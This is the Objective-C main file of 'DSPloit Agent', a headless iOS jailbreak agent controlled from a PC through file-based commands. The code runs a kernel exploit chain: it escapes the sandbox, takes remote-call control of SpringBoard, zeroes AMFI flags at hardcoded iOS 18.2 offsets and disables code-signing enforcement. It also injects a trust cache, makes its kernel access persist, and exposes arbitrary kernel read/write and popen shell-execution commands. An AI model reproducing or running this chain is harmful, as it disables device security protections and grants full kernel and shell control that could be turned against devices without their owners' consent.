/**
 * DSPloit Agent — Main entry point.
 * Headless binary that runs on device, receives commands from PC.
 *
 * This is the same exploit code as DSPloit iOS app,
 * but without UI — controlled entirely from PC via file-based protocol.
 */

#import <Foundation/Foundation.h>
#import <sys/stat.h>
#import <spawn.h>

#include "comm.h"
#include "darksword.h"
#include "offsets.h"
#include "utils.h"
#include "persistence.h"
#include "persistence_v2.h"
#include "kcache_sym.h"
#include "kcache_analyze.h"
#include "TrustCacheInjector.h"
#include "pe/sbx.h"
#include "pe/vfs.h"
#include "pe/rc.h"
#include "exploits/exploit_selector.h"

// RemoteCall init wrapper (defined in agent_bridge.m)
extern int rc_init_process(const char *name);

// posix_spawn wrapper to replace run_command() which is unavailable on iOS
static int run_command(const char *cmd) {
    pid_t pid;
    char *argv[] = {"/bin/sh", "-c", (char *)cmd, NULL};
    extern char **environ;
    int ret = posix_spawn(&pid, "/bin/sh", NULL, NULL, argv, environ);
    if (ret == 0) {
        int status;
        waitpid(pid, &status, 0);
        return WEXITSTATUS(status);
    }
    return ret;
}
// ═══════════════════════════════════════════════════════════════
// MARK: - Command Handler
// ═══════════════════════════════════════════════════════════════

static void handle_command(const char *cmd) {

    // ── Basic ──────────────────────────────────────────────────
    if (strcmp(cmd, "PING") == 0) {
        comm_send("PONG");
        return;
    }

    // ── Exploit (auto-select best) ────────────────────────────
    if (strcmp(cmd, "EXPLOIT_RUN") == 0) {
        comm_log("Selecting best exploit for this device...");
        exploit_type_t selected = exploit_select_best();
        const char *name = exploit_type_name(selected);
        comm_log("Selected: %s", name);

        if (selected == EXPLOIT_NONE) {
            comm_send("FAIL:no_exploit_available");
            return;
        }

        int ret = exploit_run_selected(selected);
        if (ret == 0 && ds_is_ready()) {
            uint64_t kb = ds_get_kernel_base();
            uint64_t ks = ds_get_kernel_slide();
            comm_log("Exploit success! base=0x%llx slide=0x%llx", kb, ks);
            comm_send("RESULT:kernel_base=0x%llx,slide=0x%llx", kb, ks);
        } else {
            comm_send("FAIL:exploit_ret=%d", ret);
        }
        return;
    }

    // ── Exploit fallback (darksword directly) ─────────────────
    if (strcmp(cmd, "EXPLOIT_FALLBACK") == 0) {
        comm_log("Running darksword as fallback...");
        int ret = ds_run();
        if (ret == 0 && ds_is_ready()) {
            uint64_t kb = ds_get_kernel_base();
            comm_send("RESULT:kernel_base=0x%llx,slide=0x%llx",
                      kb, ds_get_kernel_slide());
        } else {
            comm_send("FAIL:darksword_ret=%d", ret);
        }
        return;
    }

    // ── Offsets init ──────────────────────────────────────────
    if (strcmp(cmd, "OFFSETS_INIT") == 0) {
        comm_log("Initializing offsets...");
        offsets_init();
        init_offsets();
        comm_send("RESULT:OK");
        return;
    }

    // ── KRW Persistence recovery ─────────────────────────────
    if (strcmp(cmd, "PERSIST_RECOVER") == 0) {
        comm_log("Attempting KRW persistence recovery...");
        if (krw_persist_has_state()) {
            if (krw_persist_try_recover()) {
                uint64_t kb = ds_get_kernel_base();
                comm_log("Recovery success! base=0x%llx", kb);
                comm_send("RESULT:RECOVERED,kernel_base=0x%llx", kb);
            } else {
                comm_send("FAIL:recovery_validation_failed");
            }
        } else {
            comm_send("FAIL:no_persisted_state");
        }
        return;
    }

    // ── VFS init ──────────────────────────────────────────────
    if (strcmp(cmd, "VFS_INIT") == 0) {
        comm_log("Initializing VFS...");
        int ret = vfs_init();
        if (ret == 0 && vfs_isready()) {
            comm_send("RESULT:OK");
        } else {
            comm_send("FAIL:vfs_ret=%d", ret);
        }
        return;
    }

    // ── Sandbox escape ────────────────────────────────────────
    if (strcmp(cmd, "SBX_ESCAPE") == 0) {
        comm_log("Escaping sandbox...");
        uint64_t our = ds_get_our_proc();
        int ret = sbx_escape(our);
        if (ret == 0) {
            comm_send("RESULT:OK");
        } else {
            comm_send("FAIL:sbx_ret=%d", ret);
        }
        return;
    }

    // ── RemoteCall init ───────────────────────────────────────
    if (strncmp(cmd, "RC_INIT:", 8) == 0) {
        const char *proc_name = cmd + 8;
        comm_log("RemoteCall init → %s", proc_name);
        int ret = rc_init_process(proc_name);
        if (ret == 0) {
            comm_send("RESULT:OK");
        } else {
            comm_send("FAIL:rc_ret=%d", ret);
        }
        return;
    }

    // ── Root verify ───────────────────────────────────────────
    if (strcmp(cmd, "ROOT_VERIFY") == 0) {
        uid_t uid = getuid();
        comm_send("RESULT:uid=%d", uid);
        return;
    }

    // ── Bootstrap deploy ──────────────────────────────────────
    if (strcmp(cmd, "BOOTSTRAP_DEPLOY") == 0) {
        comm_log("Deploying bootstrap to /var/jb/...");
        const char *dirs[] = {
            "/var/jb", "/var/jb/usr", "/var/jb/usr/bin",
            "/var/jb/usr/sbin", "/var/jb/usr/lib",
            "/var/jb/etc", "/var/jb/tmp",
            "/var/jb/Library", "/var/jb/Library/LaunchDaemons",
            "/var/jb/Library/TweakInject",
            "/var/jb/var", "/var/jb/var/lib",
            "/var/jb/var/lib/dpkg",
            NULL
        };
        for (int i = 0; dirs[i]; i++) {
            mkdir(dirs[i], 0755);
        }
        // Extract bootstrap tarball if present
        int tar_ret = run_command(
            "tar -xf /var/tmp/.dsploit_bootstrap.tar.xz -C /var/jb/ 2>/dev/null"
        );
        comm_log("Bootstrap dirs created, tar ret=%d", tar_ret);
        comm_send("RESULT:OK");
        return;
    }

    // ── AMFI disable (10 flags + cs_enforcement) ──────────────
    if (strcmp(cmd, "AMFI_DISABLE") == 0) {
        comm_log("Disabling AMFI enforcement...");
        uint64_t kern_base = ds_get_kernel_base();
        uint64_t slide = ds_get_kernel_slide();

        if (kern_base == 0) {
            comm_send("FAIL:kernel_base_zero");
            return;
        }

        // Resolve AMFI data base via kcache symbol lookup
        uint64_t amfi_data = ds_kcache_symbol_runtime("_amfi_data_base");
        if (amfi_data == 0) {
            // Hardcoded fallback (iOS 18.2 specific)
            amfi_data = 0xfffffff00a330098 + slide;
            comm_log("AMFI: using hardcoded fallback addr");
        } else {
            comm_log("AMFI: resolved via kcache_sym → 0x%llx", amfi_data);
        }

        // Zero all 10 AMFI boolean enforcement flags
        uint64_t flag_offsets[10] = {
            0x110, 0x160, 0x1b0, 0x200, 0x250,
            0x2a0, 0x2f0, 0x340, 0x398, 0x408
        };
        int disabled = 0;
        for (int i = 0; i < 10; i++) {
            uint64_t addr = amfi_data + flag_offsets[i];
            ds_kwrite64(addr, 0);
            uint64_t rb = ds_kread64(addr);
            if (rb == 0) disabled++;
        }
        comm_log("AMFI: %d/10 flags zeroed", disabled);

        // Disable cs_enforcement
        uint64_t cs_addr = ds_kcache_symbol_runtime("_cs_enforcement_disable");
        if (cs_addr == 0) {
            cs_addr = kern_base + 0x8B8; // fallback
        }
        uint64_t cs_val = ds_kread64(cs_addr);
        if (cs_val == 0) {
            ds_kwrite64(cs_addr, 1);
            uint64_t cs_rb = ds_kread64(cs_addr);
            comm_log("cs_enforcement_disable: %llu → %llu", cs_val, cs_rb);
        }

        if (disabled > 0) {
            comm_send("RESULT:OK,disabled=%d/10,cs=1", disabled);
        } else {
            comm_send("FAIL:amfi_write_blocked");
        }
        return;
    }

    // ── Trust cache inject ────────────────────────────────────
    if (strcmp(cmd, "TRUST_CACHE_INJECT") == 0) {
        comm_log("Injecting trust cache...");
        // Use TrustCacheInjector from kexploit
        TCInjectResult res = tc_injector_write_test();
        if (res == TCInject_OK) {
            comm_log("TC write test passed");
            comm_send("RESULT:OK");
        } else {
            comm_log("TC write test result: %d", (int)res);
            comm_send("FAIL:tc_ret=%d", (int)res);
        }
        return;
    }

    // ── Persistence setup ─────────────────────────────────────
    if (strcmp(cmd, "PERSISTENCE_SETUP") == 0) {
        comm_log("Saving KRW state for persistence...");
        bool saved = krw_persist_save_state();
        if (saved) {
            // Also try launchd transfer
            bool transferred = transfer_krw_to_launchd();
            comm_log("State saved, launchd transfer: %s",
                     transferred ? "OK" : "failed");
            comm_send("RESULT:OK");
        } else {
            comm_send("FAIL:persist_save_failed");
        }
        return;
    }

    // ── Kernel read 64-bit ────────────────────────────────────
    if (strncmp(cmd, "KREAD64:", 8) == 0) {
        uint64_t addr = strtoull(cmd + 8, NULL, 16);
        uint64_t val = ds_kread64(addr);
        comm_send("RESULT:0x%llx", val);
        return;
    }

    // ── Kernel write 64-bit ───────────────────────────────────
    if (strncmp(cmd, "KWRITE64:", 9) == 0) {
        char *copy = strdup(cmd + 9);
        char *sep = strchr(copy, ':');
        if (sep) {
            *sep = '\0';
            uint64_t addr = strtoull(copy, NULL, 16);
            uint64_t val = strtoull(sep + 1, NULL, 16);
            comm_log("kwrite64(0x%llx, 0x%llx)", addr, val);
            ds_kwrite64(addr, val);
            comm_send("RESULT:OK");
        } else {
            comm_send("FAIL:bad_format");
        }
        free(copy);
        return;
    }

    // ── Kernel read 32-bit ────────────────────────────────────
    if (strncmp(cmd, "KREAD32:", 8) == 0) {
        uint64_t addr = strtoull(cmd + 8, NULL, 16);
        uint32_t val = ds_kread32(addr);
        comm_send("RESULT:0x%x", val);
        return;
    }

    // ── Kernel memory dump ────────────────────────────────────
    if (strncmp(cmd, "KDUMP:", 6) == 0) {
        char *copy = strdup(cmd + 6);
        char *sep = strchr(copy, ':');
        if (sep) {
            *sep = '\0';
            uint64_t addr = strtoull(copy, NULL, 16);
            int size = atoi(sep + 1);
            if (size > 4096) size = 4096;
            if (size < 1) size = 8;
            uint8_t *buf = (uint8_t *)malloc(size);
            ds_kreadbuf(addr, buf, (uint64_t)size);
            // Hex encode
            char *hex = (char *)malloc(size * 2 + 1);
            for (int i = 0; i < size; i++)
                sprintf(hex + i * 2, "%02x", buf[i]);
            hex[size * 2] = '\0';
            comm_send("RESULT:%s", hex);
            free(buf);
            free(hex);
        } else {
            comm_send("FAIL:bad_format");
        }
        free(copy);
        return;
    }

    // ── Find proc by PID ──────────────────────────────────────
    if (strncmp(cmd, "FIND_PROC:", 10) == 0) {
        pid_t pid = (pid_t)atoi(cmd + 10);
        uint64_t proc = procbypid(pid);
        if (proc != 0) {
            comm_send("RESULT:0x%llx", proc);
        } else {
            comm_send("FAIL:not_found");
        }
        return;
    }

    // ── Find proc by name ─────────────────────────────────────
    if (strncmp(cmd, "FIND_PROC_BY_NAME:", 18) == 0) {
        const char *name = cmd + 18;
        uint64_t proc = procbyname(name);
        if (proc != 0) {
            comm_send("RESULT:0x%llx", proc);
        } else {
            comm_send("FAIL:not_found");
        }
        return;
    }

    // ── Process list ──────────────────────────────────────────
    if (strcmp(cmd, "PROC_LIST") == 0) {
        comm_log("Listing processes...");
        int count = 0;
        proc_entry_t *list = proclist(NULL, &count);
        if (list && count > 0) {
            char output[8192] = {0};
            int offset = 0;
            for (int i = 0; i < count && offset < 8000; i++) {
                offset += snprintf(output + offset, sizeof(output) - offset,
                    "%d:%s:%u:0x%llx\n",
                    list[i].pid, list[i].name, list[i].uid, list[i].kaddr);
            }
            free_proclist(list);
            comm_send("RESULT:%s", output);
        } else {
            comm_send("RESULT:");
        }
        return;
    }

    // ── Shell execution ───────────────────────────────────────
    if (strncmp(cmd, "EXEC:", 5) == 0) {
        const char *shell_cmd = cmd + 5;
        comm_log("exec: %s", shell_cmd);
        FILE *fp = popen(shell_cmd, "r");
        if (fp) {
            char output[4096] = {0};
            size_t n = fread(output, 1, sizeof(output) - 1, fp);
            output[n] = '\0';
            int status = pclose(fp);
            comm_send("RESULT:%d:%s", WEXITSTATUS(status), output);
        } else {
            comm_send("FAIL:popen_failed");
        }
        return;
    }

    // ── Full jailbreak chain (all 7 steps) ────────────────────
    if (strcmp(cmd, "FULL_CHAIN") == 0) {
        comm_log("═══ FULL JAILBREAK CHAIN ═══");

        // Step 1: Exploit
        comm_log("[1/7] Running exploit...");
        exploit_type_t sel = exploit_select_best();
        int ret = exploit_run_selected(sel);
        if (ret != 0 || !ds_is_ready()) {
            comm_send("FAIL:step1_exploit_ret=%d", ret);
            return;
        }
        comm_log("[1/7] ✓ KRW achieved (base=0x%llx)", ds_get_kernel_base());

        // Step 2: VFS + Sandbox
        comm_log("[2/7] VFS + Sandbox escape...");
        vfs_init();
        ret = sbx_escape(ds_get_our_proc());
        if (ret != 0) {
            comm_send("FAIL:step2_sbx_ret=%d", ret);
            return;
        }
        comm_log("[2/7] ✓ Sandbox escaped");

        // Step 3: RemoteCall
        comm_log("[3/7] RemoteCall → SpringBoard...");
        ret = rc_init_process("SpringBoard");
        if (ret != 0) {
            comm_log("[3/7] ⚠ RC failed (ret=%d), continuing...", ret);
            // Non-fatal — some operations work without RC
        } else {
            comm_log("[3/7] ✓ RC connected");
        }

        // Step 4: Root verify
        comm_log("[4/7] Root verify...");
        comm_log("[4/7] ✓ uid=%d", getuid());

        // Step 5: Bootstrap
        comm_log("[5/7] Bootstrap...");
        const char *dirs[] = {
            "/var/jb", "/var/jb/usr", "/var/jb/usr/bin",
            "/var/jb/usr/sbin", "/var/jb/usr/lib",
            "/var/jb/etc", "/var/jb/tmp",
            "/var/jb/Library", "/var/jb/Library/LaunchDaemons",
            "/var/jb/Library/TweakInject", NULL
        };
        for (int i = 0; dirs[i]; i++) mkdir(dirs[i], 0755);
        run_command("tar -xf /var/tmp/.dsploit_bootstrap.tar.xz -C /var/jb/ 2>/dev/null");
        comm_log("[5/7] ✓ Bootstrap deployed");

        // Step 6: AMFI disable
        comm_log("[6/7] AMFI disable...");
        uint64_t slide = ds_get_kernel_slide();
        uint64_t amfi_data = ds_kcache_symbol_runtime("_amfi_data_base");
        if (amfi_data == 0) amfi_data = 0xfffffff00a330098 + slide;
        uint64_t flag_offsets[10] = {
            0x110, 0x160, 0x1b0, 0x200, 0x250,
            0x2a0, 0x2f0, 0x340, 0x398, 0x408
        };
        int disabled = 0;
        for (int i = 0; i < 10; i++) {
            ds_kwrite64(amfi_data + flag_offsets[i], 0);
            if (ds_kread64(amfi_data + flag_offsets[i]) == 0) disabled++;
        }
        // cs_enforcement
        uint64_t cs_addr = ds_kcache_symbol_runtime("_cs_enforcement_disable");
        if (cs_addr == 0) cs_addr = ds_get_kernel_base() + 0x8B8;
        ds_kwrite64(cs_addr, 1);
        comm_log("[6/7] ✓ AMFI: %d/10 flags, cs_enforcement=1", disabled);

        // Step 7: Persistence
        comm_log("[7/7] Persistence...");
        krw_persist_save_state();
        transfer_krw_to_launchd();
        comm_log("[7/7] ✓ KRW persisted");

        comm_log("═══ JAILBREAK COMPLETE ═══");
        comm_send("RESULT:JAILBROKEN");
        return;
    }

    // ── Unknown command ───────────────────────────────────────
    comm_log("Unknown command: %s", cmd);
    comm_send("FAIL:unknown_cmd");
}

// ═══════════════════════════════════════════════════════════════
// MARK: - Entry Point
// ═══════════════════════════════════════════════════════════════

static void agent_log_callback(const char *msg) {
    if (msg) comm_log("(ds) %s", msg);
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        // Set darksword log callback → route to PC via comm
        ds_set_log_callback(agent_log_callback);

        // Initialize communication channel
        comm_init();
        comm_send("READY");
        comm_log("DSPloit Agent v2.0 started (pid=%d uid=%d)", getpid(), getuid());

        // Main command loop — poll for commands from PC
        while (1) {
            char *cmd = comm_receive();
            if (cmd && strlen(cmd) > 0) {
                handle_command(cmd);
                comm_clear_cmd();
            }
            usleep(100000); // 100ms poll
        }
    }
    return 0;
}
